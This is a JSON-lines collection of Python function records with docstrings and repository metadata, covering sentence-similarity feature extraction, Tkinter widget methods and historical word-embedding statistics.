{"docstring": "\"\"\"\nget data mining feature given two sentences as string.\n1)n-gram similiarity(blue score);\n2) get length of questions, difference of length\n3) how many words are same, how many words are unique\n4) question 1,2 start with how/why/when(\u4e3a\u4ec0\u4e48\uff0c\u600e\u4e48\uff0c\u5982\u4f55\uff0c\u4e3a\u4f55\uff09\n5\uff09edit distance\n6) cos similiarity using bag of words\n:param input_string_x1:\n:param input_string_x2:\n:return:\n\"\"\"\n", "func_signal": "def data_mining_features(index,input_string_x1,input_string_x2,vocab_word2index,word_vec_fasttext_dict,word_vec_word2vec_dict,tfidf_dict,n_gram=8):\n", "code": "input_string_x1=input_string_x1.decode(\"utf-8\")\ninput_string_x2 = input_string_x2.decode(\"utf-8\")\n#1. get blue score vector\nfeature_list=[]\n#get blue score with n-gram\nfor i in range(n_gram):\n    x1_list=split_string_as_list_by_ngram(input_string_x1,i+1)\n    x2_list = split_string_as_list_by_ngram(input_string_x2, i + 1)\n    blue_score_i_1 = compute_blue_ngram(x1_list,x2_list)\n    blue_score_i_2 = compute_blue_ngram(x2_list,x1_list)\n    feature_list.append(blue_score_i_1)\n    feature_list.append(blue_score_i_2)\n\n#2. get length of questions, difference of length\nlength1=float(len(input_string_x1))\nlength2=float(len(input_string_x2))\nlength_diff=(float(abs(length1-length2)))/((length1+length2)/2.0)\nfeature_list.append(length_diff)\n\n#3. how many words are same, how many words are unique\nsentence_diff_overlap_features_list=get_sentence_diff_overlap_pert(index,input_string_x1,input_string_x2)\nfeature_list.extend(sentence_diff_overlap_features_list)\n\n#4. question 1,2 start with how/why/when(\u4e3a\u4ec0\u4e48\uff0c\u600e\u4e48\uff0c\u5982\u4f55\uff0c\u4e3a\u4f55\uff09\n#how_why_feature_list=get_special_start_token(input_string_x1,input_string_x2,special_start_token)\n#print(\"how_why_feature_list:\",how_why_feature_list)\n#feature_list.extend(how_why_feature_list)\n\n#5.edit distance\nedit_distance=float(edit(input_string_x1, input_string_x2))/30.0\nfeature_list.append(edit_distance)\n\n#6.cos distance from sentence embedding\nx1_list=token_string_as_list(input_string_x1, tokenize_style='word')\nx2_list = token_string_as_list(input_string_x2, tokenize_style='word')\ndistance_list_fasttext = cos_distance_bag_tfidf(x1_list, x2_list, word_vec_fasttext_dict, tfidf_dict)\ndistance_list_word2vec = cos_distance_bag_tfidf(x1_list, x2_list, word_vec_word2vec_dict, tfidf_dict)\n#distance_list2 = cos_distance_bag_tfidf(x1_list, x2_list, word_vec_fasttext_dict, tfidf_dict,tfidf_flag=False)\n#sentence_diffence=np.abs(np.subtract(sentence_vec_1,sentence_vec_2))\n#sentence_multiply=np.multiply(sentence_vec_1,sentence_vec_2)\nfeature_list.extend(distance_list_fasttext)\nfeature_list.extend(distance_list_word2vec)\n#feature_list.extend(list(sentence_diffence))\n#feature_list.extend(list(sentence_multiply))\nreturn feature_list", "path": "data_util_test.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "\"\"\"\nload test data, transfer to data suitable for model\n:param test_data_path:\n:param vocab_word2index:\n:param vocab_label2index:\n:param max_sentence_len:\n:return:\n\"\"\"\n#1.load test data\n", "func_signal": "def load_test_data(test_data_path,vocab_word2index,max_sentence_len,tokenize_style='char'):\n", "code": "fin=open(test_data_path, 'r')\nX1=[]\nX2=[]\nlineno_list=[]\ncount=0\n\nword_vec_fasttext_dict=load_word_vec('data/fasttext_fin_model_50.vec') #word embedding from fasttxt\nword_vec_word2vec_dict = load_word_vec('data/word2vec.txt') #word embedding from word2vec\ntfidf_dict=load_tfidf_dict('data/atec_nl_sim_tfidf.txt')\nBLUE_SCORE=[]\nfor i,line in enumerate(fin):\n    lineno, sen1, sen2 = line.strip().split('\\t')\n    lineno_list.append(lineno)\n    sen1=sen1.decode(\"utf-8\")\n    x1_list_ = token_string_as_list(sen1, tokenize_style=tokenize_style)\n    sen2=sen2.decode(\"utf-8\")\n    x2_list_ = token_string_as_list(sen2, tokenize_style=tokenize_style)\n    x1_list = [vocab_word2index.get(x, UNK_ID) for x in x1_list_]\n    x2_list = [vocab_word2index.get(x, UNK_ID) for x in x2_list_]\n    x1_list=pad_sequences(x1_list, max_sentence_len)\n    x2_list=pad_sequences(x2_list,max_sentence_len)\n    if count<10:#print some message\n        print(\"x1_list:\",x1_list)\n        print(\"x2_list:\",x2_list)\n        count=count+1\n\n    X1.append(x1_list)\n    X2.append(x2_list)\n\n    features_vector = data_mining_features(i, sen1, sen2, vocab_word2index, word_vec_fasttext_dict,word_vec_word2vec_dict, tfidf_dict, n_gram=8)\n    features_vector=[float(x) for x in features_vector]\n    BLUE_SCORE.append(features_vector)\n\ntest=(lineno_list,X1,X2,BLUE_SCORE)\nreturn test", "path": "data_util_test.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "\"\"\"\nget label by logits using index2label dict\n:param logits:\n:param vocabulary_index2label:\n:return:\n\"\"\"\n# logits:[batch_size,num_classes]\n", "func_signal": "def get_label_by_logits(logits, vocabulary_index2label):\n", "code": "pred_labels = np.argmax(logits, axis=1)  # [batch_size]\n#result = [vocabulary_index2label[l] for l in pred_labels]\nresult=[]\nfor l in pred_labels:\n    r=vocabulary_index2label[l]\n    result.append(r)\n\nreturn result", "path": "data_util_test.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "#1.1save vocabulary_word2index\n", "func_signal": "def save_vocab_as_file(vocab_word2index,vocab_index2label,vocab_list,name_scope='cnn'):\n", "code": "cache_vocab_label_pik = 'cache' + \"_\" + name_scope\nvocab_word2index_object=open(cache_vocab_label_pik+'/'+'vocab_word2index.txt',mode='a')\nfor word,index in vocab_word2index.items():\n    vocab_word2index_object.write(word+splitter+str(index)+\"\\n\")\nvocab_word2index_object.close()\n\n#1.2 save word and frequent\nword_freq_object=open(cache_vocab_label_pik+'/'+'word_freq.txt',mode='a')\nfor tuplee in vocab_list:\n    word,count=tuplee\n    word_freq_object.write(word+\"|||\"+str(count)+\"\\n\")\nword_freq_object.close()\n\n#2.vocabulary_index2label\nvocab_index2label_object = open(cache_vocab_label_pik + '/' + 'vocab_index2label.txt',mode='a')\nfor index,label in vocab_index2label.items():\n    vocab_index2label_object.write(str(index)+splitter+str(label)+\"\\n\")\nvocab_index2label_object.close()", "path": "data_util.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "#print(\"input_string0:\",input_string)\n", "func_signal": "def split_string_as_list_by_ngram(input_string,ngram_value):\n", "code": "input_string=\"\".join([string for string in input_string if string.strip()])\n#print(\"input_string1:\",input_string)\nlength = len(input_string)\nresult_string=[]\nfor i in range(length):\n    if i + ngram_value < length + 1:\n        result_string.append(input_string[i:i+ngram_value])\n#print(\"ngram:\",ngram_value,\"result_string:\",result_string)\nreturn result_string", "path": "data_util_test.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "\"\"\"\ncompute blue score use ngram information. x1_list as predict sentence,x2_list as target sentence\n:param x1_list:\n:param x2_list:\n:return:\n\"\"\"\n", "func_signal": "def compute_blue_ngram(x1_list,x2_list):\n", "code": "count_dict={}\ncount_dict_clip={}\n#1. count for each token at predict sentence side.\nfor token in x1_list:\n    if token not in count_dict:\n        count_dict[token]=1\n    else:\n        count_dict[token]=count_dict[token]+1\ncount=np.sum([value for key,value in count_dict.items()])\n\n#2.count for tokens existing in predict sentence for target sentence side.\nfor token in x2_list:\n    if token in count_dict:\n        if token not in count_dict_clip:\n            count_dict_clip[token]=1\n        else:\n            count_dict_clip[token]=count_dict_clip[token]+1\n\n#3. clip value to ceiling value for that token\ncount_dict_clip={key:(value if value<=count_dict[key] else count_dict[key]) for key,value in count_dict_clip.items()}\ncount_clip=np.sum([value for key,value in count_dict_clip.items()])\nresult=float(count_clip)/(float(count)+0.00000001)\nreturn result", "path": "data_util_test.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "# 1.form more training data by swap sentence1 and sentence2\n", "func_signal": "def get_training_data(X1,X2,BLUE_SCORES,Y,training_number,shuffle_word_flag=False):\n", "code": "X1_big = []\nX2_big = []\nBLUE_SCORE_big=[]\nY_big = []\n\nX1_final = []\nX2_final = []\nBLUE_SCORE_final=[]\nY_final = []\nfor index in range(0, training_number):\n    X1_big.append(X1[index])\n    X2_big.append(X2[index])\n    BLUE_SCORE_big.append(BLUE_SCORES[index])\n    y_temp = Y[index]\n    Y_big.append(y_temp)\n    #a.swap sentence1 and sentence2\n    if str(y_temp) == TRUE_LABEL:\n        X1_big.append(X2[index])\n        X2_big.append(X1[index])\n        BLUE_SCORE_big.append(BLUE_SCORES[index])\n        Y_big.append(y_temp)\n\n    #b.random change location of words\n    if shuffle_word_flag:\n        for x in range(5):\n            x1=X1[index]\n            x2=X2[index]\n            x1_random=[x1[i] for i in range(len(x1))]\n            x2_random = [x2[i] for i in range(len(x2))]\n            random.shuffle(x1_random)\n            random.shuffle(x2_random)\n            X1_big.append(x1_random)\n            X2_big.append(x2_random)\n            BLUE_SCORE_big.append(BLUE_SCORES[index])\n            Y_big.append(Y[index])\n\n# shuffle data\ntraining_number_big = len(X1_big)\npermutation2 = np.random.permutation(training_number_big)\nfor index in permutation2:\n    X1_final.append(X1_big[index])\n    X2_final.append(X2_big[index])\n    BLUE_SCORE_final.append(BLUE_SCORE_big[index])\n    Y_final.append(Y_big[index])\n\nreturn X1_final,X2_final,BLUE_SCORE_final,Y_final,training_number_big", "path": "data_util.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "\"\"\"Return information about the options\nfor positioning this widget in a grid.\"\"\"\n", "func_signal": "def grid_info(self):\n", "code": "words = self.tk.splitlist(self.tk.call('grid', 'info', self._w))\ndict = {}\nfor i in range(0, len(words), 2):\n    key = words[i][1:]\n    value = words[i + 1]\n    if value[:1] == '.':\n        value = self._nametowidget(value)\n    dict[key] = value\n\nreturn dict", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Place a widget in the parent widget. Use as options:\nin=master - master relative to which the widget is placed\nin_=master - see 'in' option description\nx=amount - locate anchor of this widget at position x of master\ny=amount - locate anchor of this widget at position y of master\nrelx=amount - locate anchor of this widget between 0.0 and 1.0\n              relative to width of master (1.0 is right edge)\nrely=amount - locate anchor of this widget between 0.0 and 1.0\n              relative to height of master (1.0 is bottom edge)\nanchor=NSEW (or subset) - position anchor according to given direction\nwidth=amount - width of this widget in pixel\nheight=amount - height of this widget in pixel\nrelwidth=amount - width of this widget between 0.0 and 1.0\n                  relative to width of master (1.0 is the same width\n                  as the master)\nrelheight=amount - height of this widget between 0.0 and 1.0\n                   relative to height of master (1.0 is the same\n                   height as the master)\nbordermode=\"inside\" or \"outside\" - whether to take border width of\n                                   master widget into account\n\"\"\"\n", "func_signal": "def place_configure(self, cnf={}, **kw):\n", "code": "self.tk.call((\n 'place', 'configure', self._w) + self._options(cnf, kw))", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Clear the current X selection.\"\"\"\n", "func_signal": "def selection_clear(self, **kw):\n", "code": "if 'displayof' not in kw:\n    kw['displayof'] = self._w\nself.tk.call(('selection', 'clear') + self._options(kw))", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Internal function.\"\"\"\n", "func_signal": "def _root(self):\n", "code": "w = self\nwhile w.master:\n    w = w.master\n\nreturn w", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Return the Tkinter instance of a widget identified by\nits Tcl name NAME.\"\"\"\n", "func_signal": "def nametowidget(self, name):\n", "code": "name = str(name).split('.')\nw = self\nif not name[0]:\n    w = w._root()\n    name = name[1:]\nfor n in name:\n    if not n:\n        break\n    w = w.children[n]\n\nreturn w", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Query a management option for window.\n\nOption may be any value allowed by the paneconfigure subcommand\n\"\"\"\n", "func_signal": "def panecget(self, child, option):\n", "code": "return self.tk.call((\n self._w, 'panecget') + (child, '-' + option))", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Unbind for this widget for event SEQUENCE  the\nfunction identified with FUNCID.\"\"\"\n", "func_signal": "def unbind(self, sequence, funcid=None):\n", "code": "self.tk.call('bind', self._w, sequence, '')\nif funcid:\n    self.deletecommand(funcid)", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Internal function.\n\nDelete the Tcl command provided in NAME.\"\"\"\n", "func_signal": "def deletecommand(self, name):\n", "code": "self.tk.deletecommand(name)\ntry:\n    self._tclCommands.remove(name)\nexcept ValueError:\n    pass", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Bind function FUNC to command NAME for this widget.\nReturn the function bound to NAME if None is given. NAME could be\ne.g. \"WM_SAVE_YOURSELF\" or \"WM_DELETE_WINDOW\".\"\"\"\n", "func_signal": "def wm_protocol(self, name=None, func=None):\n", "code": "if hasattr(func, '__call__'):\n    command = self._register(func)\nelse:\n    command = func\nreturn self.tk.call('wm', 'protocol', self._w, name, command)", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Return the resource value for an ITEM and an OPTION.\"\"\"\n", "func_signal": "def itemcget(self, index, option):\n", "code": "return self.tk.call((\n self._w, 'itemcget') + (index, '-' + option))", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Query and change the horizontal position of the view.\"\"\"\n", "func_signal": "def xview(self, *args):\n", "code": "res = self.tk.call(self._w, 'xview', *args)\nif not args:\n    return self._getdoubles(res)", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Internal function.\"\"\"\n", "func_signal": "def _flatten(tuple):\n", "code": "res = ()\nfor item in tuple:\n    if type(item) in (TupleType, ListType):\n        res = res + _flatten(item)\n    elif item is not None:\n        res = res + (item,)\n\nreturn res", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Clear the data in the Tk clipboard.\n\nA widget specified for the optional displayof keyword\nargument specifies the target display.\"\"\"\n", "func_signal": "def clipboard_clear(self, **kw):\n", "code": "if 'displayof' not in kw:\n    kw['displayof'] = self._w\nself.tk.call(('clipboard', 'clear') + self._options(kw))", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Return the contents of the current X selection.\n\nA keyword parameter selection specifies the name of\nthe selection and defaults to PRIMARY.  A keyword\nparameter displayof specifies a widget on the display\nto use.\"\"\"\n", "func_signal": "def selection_get(self, **kw):\n", "code": "if 'displayof' not in kw:\n    kw['displayof'] = self._w\nreturn self.tk.call(('selection', 'get') + self._options(kw))", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Specify a function COMMAND to call if the X\nselection owned by this widget is queried by another\napplication.\n\nThis function must return the contents of the\nselection. The function will be called with the\narguments OFFSET and LENGTH which allows the chunking\nof very long selections. The following keyword\nparameters can be provided:\nselection - name of the selection (default PRIMARY),\ntype - type of the selection (e.g. STRING, FILE_NAME).\"\"\"\n", "func_signal": "def selection_handle(self, command, **kw):\n", "code": "name = self._register(command)\nself.tk.call(('selection', 'handle') + self._options(kw) + (self._w, name))", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Pack a widget in the parent widget. Use as options:\nafter=widget - pack it after you have packed widget\nanchor=NSEW (or subset) - position widget according to\n                          given direction\nbefore=widget - pack it before you will pack widget\nexpand=bool - expand widget if parent size grows\nfill=NONE or X or Y or BOTH - fill widget if widget grows\nin=master - use master to contain this widget\nin_=master - see 'in' option description\nipadx=amount - add internal padding in x direction\nipady=amount - add internal padding in y direction\npadx=amount - add padding in x direction\npady=amount - add padding in y direction\nside=TOP or BOTTOM or LEFT or RIGHT -  where to add this widget.\n\"\"\"\n", "func_signal": "def pack_configure(self, cnf={}, **kw):\n", "code": "self.tk.call((\n 'pack', 'configure', self._w) + self._options(cnf, kw))", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Return a tuple of integer coordinates for the bounding\nbox of this widget controlled by the geometry manager grid.\n\nIf COLUMN, ROW is given the bounding box applies from\nthe cell with row and column 0 to the specified\ncell. If COL2 and ROW2 are given the bounding box\nstarts at that cell.\n\nThe returned integers specify the offset of the upper left\ncorner in the master widget and the width and height.\n\"\"\"\n", "func_signal": "def grid_bbox(self, column=None, row=None, col2=None, row2=None):\n", "code": "args = (\n 'grid', 'bbox', self._w)\nif column is not None and row is not None:\n    args = args + (column, row)\nif col2 is not None and row2 is not None:\n    args = args + (col2, row2)\nreturn self._getints(self.tk.call(*args)) or None", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Return a list of all widgets which are children of this widget.\"\"\"\n", "func_signal": "def winfo_children(self):\n", "code": "result = []\nfor child in self.tk.splitlist(self.tk.call('winfo', 'children', self._w)):\n    try:\n        result.append(self._nametowidget(child))\n    except KeyError:\n        pass\n\nreturn result", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Return a new PhotoImage based on the same image as this widget\nbut use only every Xth or Yth pixel.\"\"\"\n", "func_signal": "def subsample(self, x, y=''):\n", "code": "destImage = PhotoImage()\nif y == '':\n    y = x\nself.tk.call(destImage, 'copy', self.name, '-subsample', x, y)\nreturn destImage", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"Return previous widget in the focus order. See tk_focusNext for details.\"\"\"\n", "func_signal": "def tk_focusPrev(self):\n", "code": "name = self.tk.call('tk_focusPrev', self._w)\nif not name:\n    return None\nelse:\n    return self._nametowidget(name)", "path": "Python\\Core\\Lib\\lib-tk\\Tkinter.py", "repo_name": "francisck/DanderSpritz_docs", "stars": 259, "license": "None", "language": "python", "size": 129294}
{"docstring": "\"\"\"\nReturns dictionary mapping year to:\n    \"index\": word->id index for that year.\n    \"list\": word_list for that year\n    \"indices\": set of valid indices corresponding to the word list\nAssumes that each year is indexed seperately.\n\"\"\"\n", "func_signal": "def load_year_index_infos(index_dir, years, word_file, num_words=-1):\n", "code": "if \"index.pkl\" in os.listdir(index_dir):\n    return load_year_index_infos_common(load_pickle(index_dir + \"index.pkl\"),\n            years, word_file, num_words=num_words)\nyear_index_infos = collections.defaultdict(dict)\nword_lists = load_year_words(word_file, years)\nfor year, word_list in word_lists.iteritems():\n    year_index = load_pickle(index_dir + \"/\" + str(year) + \"-index.pkl\") \n    year_index_infos[year][\"index\"] = year_index\n    if num_words != -1:\n        word_list = word_list[:num_words]\n    word_list, word_indices = get_word_indices(word_list, year_index)\n    year_index_infos[year][\"list\"] = word_list\n    year_index_infos[year][\"indices\"] = word_indices\nreturn year_index_infos", "path": "ioutils.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\"\nReturn the mean and stderr arrays for the values of the words in the set words for the specified years \n\"\"\"\n", "func_signal": "def get_series_mean_std(words_time_series, words, one_minus=False, start_year=1900, end_year=2000, year_inc=1, exclude_partial_missing=False):\n", "code": "i_i_year_words = {year:words for year in range(start_year, end_year+1, year_inc)}\nreturn get_series_mean_std_peryear(words_time_series, i_i_year_words, one_minus, start_year, end_year, year_inc, exclude_partial_missing)", "path": "statutils\\seriesanalysis.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\"\nAssumes the vectors have been normalized.\n\"\"\"\n", "func_signal": "def similarity(self, w1, w2):\n", "code": "if self.oov(w1) or self.oov(w2):\n    return float('nan')\nreturn self.represent(w1).dot(self.represent(w2).T)[0, 0]", "path": "representations\\explicit.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\"\nAssumes the vectors have been normalized.\n\"\"\"\n", "func_signal": "def closest(self, w, n=10):\n", "code": "scores = self.m.dot(self.represent(w))\nreturn heapq.nlargest(n, zip(scores, self.iw))", "path": "sgns\\hyperwords\\hyperwords\\representations\\embedding.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\"\nAssumes the vectors have been normalized.\n\"\"\"\n", "func_signal": "def closest(self, w, n=10):\n", "code": "if self.oov(w):\n    return []\nscores = self.m.dot(self.represent(w).T).T.tocsr()\nreturn heapq.nlargest(n, zip(scores.data, [self.iw[i] for i in scores.indices]))", "path": "representations\\explicit.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\"\nReturn the mean and stderr arrays for the values of the words specified per year in i_year_words for specified years \n\"\"\"\n", "func_signal": "def get_series_mean_stderr_peryear(word_time_series, i_year_words, one_minus=False, start_year=1900, end_year=2000, year_inc=1,  exclude_partial_missing=False):\n", "code": "means = []\nstderrs = []\nr_word_time_series = {}\nif exclude_partial_missing:\n    for word, time_series in word_time_series.iteritems():\n        time_series = {year:val for year, val in time_series.iteritems() if year >= start_year and year <= end_year}\n        if not np.isnan(np.sum(time_series.values())):\n            r_word_time_series[word] = time_series\nelse:\n    r_word_time_series = word_time_series\nfor year in xrange(start_year, end_year + 1, year_inc):\n    word_array = np.array([r_word_time_series[word][year] for word in i_year_words[year] \n        if word in r_word_time_series and not np.isnan(r_word_time_series[word][year])])\n    if one_minus:\n        word_array = 1 - word_array\n    means.append(word_array.mean())\n    stderrs.append(word_array.std() / len(word_array))\nreturn np.array(means), np.array(stderrs)", "path": "statutils\\seriesanalysis.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\"\nGets the mean relative deviation of the words in words vs. the full series.\n\"\"\"\n", "func_signal": "def get_yearly_set_dev(series, i_year_words, one_minus=False, start_year=1900, end_year=2000, method='diff'):\n", "code": "base_mat = _make_series_mat(series, series.keys(), one_minus=one_minus, start_year=start_year, end_year=end_year)\nmeans = []\nstderrs = []\nr_word_time_series = series\nfor year in xrange(start_year, end_year + 1):\n    word_array = np.array([r_word_time_series[word][year] for word in i_year_words[year] \n        if word in r_word_time_series and not np.isnan(r_word_time_series[word][year])])\n    if one_minus:\n        word_array = 1 - word_array\n    if method == 'diff':\n        word_array = word_array - base_mat.mean(0)[year-start_year]\n    elif method == 'ratio':\n        word_array = word_array / base_mat.mean(0)[year-start_year]\n    else:\n        raise RuntimeError(\"Unknown deviation method. Use diff or ratio.\")\n    means.append(word_array.mean())\n    stderrs.append(word_array.std() / len(word_array))\nreturn np.array(means), np.array(stderrs)", "path": "statutils\\seriesanalysis.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\"\nGets the per-year correlation between the two word time series.\nWords are included even if they have values missing for a year, but there missing values are excluded from the year in question.\n\"\"\"\n", "func_signal": "def series_corr(word_year_series_1, word_year_series_2, i_year_words, start_year=1900, end_year=2000, series_1_norms=None, series_2_norms=None):\n", "code": "year_corrs = []\nyear_ps = []\nyears = range(start_year, end_year + 1)\nif start_year not in i_year_words:\n    i_year_words = {year:i_year_words for year in years}\nif series_1_norms == None:\n    series_1_norms = ([0 for year in years], [1 for year in years])\nif series_2_norms == None:\n    series_2_norms = ([0 for year in years], [1 for year in years])\nfor i in xrange(len(years)):\n    year = years[i]\n    s1 = []\n    s2 = []\n    for word in i_year_words[year]:\n        if word in word_year_series_1 and word in word_year_series_2:\n            if not np.isnan(word_year_series_1[word][year]) and not np.isnan(word_year_series_2[word][year]):\n                s1.append((word_year_series_1[word][year] - series_1_norms[0][i]) / series_1_norms[1][i])\n                s2.append((word_year_series_2[word][year] - series_2_norms[0][i]) / series_2_norms[1][i])\n    corr, p = spearmanr(s1, s2)\n    year_corrs.append(corr)\n    year_ps.append(p)\nreturn year_corrs, year_ps", "path": "statutils\\seriesanalysis.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\"\nReturn the mean and stderr arrays for the values of the words in the set words for the specified years \n\"\"\"\n", "func_signal": "def get_series_median(words_time_series, words, one_minus=False, start_year=1900, end_year=2000, year_inc=10, exclude_partial_missing=False):\n", "code": "i_year_words = {year:words for year in range(start_year, end_year+1, year_inc)}\nreturn get_series_median_peryear(words_time_series, i_year_words, one_minus, start_year, end_year, year_inc, exclude_partial_missing)", "path": "statutils\\seriesanalysis.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\"\nAssumes the vectors have been normalized.\n\"\"\"\n", "func_signal": "def closest_contexts(self, w, n=10):\n", "code": "scores = self.represent(w)\nreturn heapq.nlargest(n, zip(scores.data, [self.ic[i] for i in scores.indices]))", "path": "sgns\\hyperwords\\hyperwords\\representations\\explicit.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "# TODO: remove this and just set the plot axes directly\n", "func_signal": "def plot_words(word1, words, fitted, cmap, sims):\n", "code": "plt.scatter(fitted[:,0], fitted[:,1], alpha=0)\nplt.suptitle(\"%s\" % word1, fontsize=30, y=0.1)\nplt.axis('off')\n\nannotations = []\nisArray = type(word1) == list\nfor i in xrange(len(words)):\n    pt = fitted[i]\n\n    ww,decade = [w.strip() for w in words[i].split(\"|\")]\n    color = cmap((int(decade) - 1840) / 10 + CMAP_MIN)\n    word = ww\n    sizing = sims[words[i]] * 30\n\n    # word1 is the word we are plotting against\n    if ww == word1 or (isArray and ww in word1):\n        annotations.append((ww, decade, pt))\n        word = decade\n        color = 'black'\n        sizing = 15\n\n\n    plt.text(pt[0], pt[1], word, color=color, size=int(sizing))\n\nreturn annotations", "path": "viz\\common.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\"\nRestricts the context words (i.e, columns) to the provided words.\n\"\"\"\n", "func_signal": "def restrict_context(self, rel_words):\n", "code": "rel_words = [word for word in rel_words if word in self.ci]\nrel_indices = np.array([self.ci[rel_word] for rel_word in rel_words])\nself.m = self.m[:, rel_indices]\nself.ic = rel_words\nself.ci = {c:i for i,c in enumerate(self.ic)}", "path": "representations\\explicit.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
{"docstring": "\"\"\"\nGets the mean relative deviation of the words in words vs. the full series.\nOnly words with valid values throughout the series are included.\n\"\"\"\n", "func_signal": "def get_set_dev(series, words, one_minus=False, start_year=1900, end_year=2000, method='diff'):\n", "code": "base_mat = _make_series_mat(series, series.keys(), one_minus=one_minus, start_year=start_year, end_year=end_year)\nword_mat =  _make_series_mat(series, words, one_minus=one_minus, start_year=start_year, end_year=end_year)\nif method == 'diff':\n    word_mat = word_mat - base_mat.mean(0)\nelif method == 'ratio':\n    word_mat = word_mat / base_mat.mean(0)\nelse:\n    raise RuntimeError(\"Unknown deviation method. Use diff or ratio.\")\nreturn word_mat.mean(0), word_mat.std(0) / np.sqrt(len(words))", "path": "statutils\\seriesanalysis.py", "repo_name": "williamleif/histwords", "stars": 386, "license": "apache-2.0", "language": "python", "size": 1044}
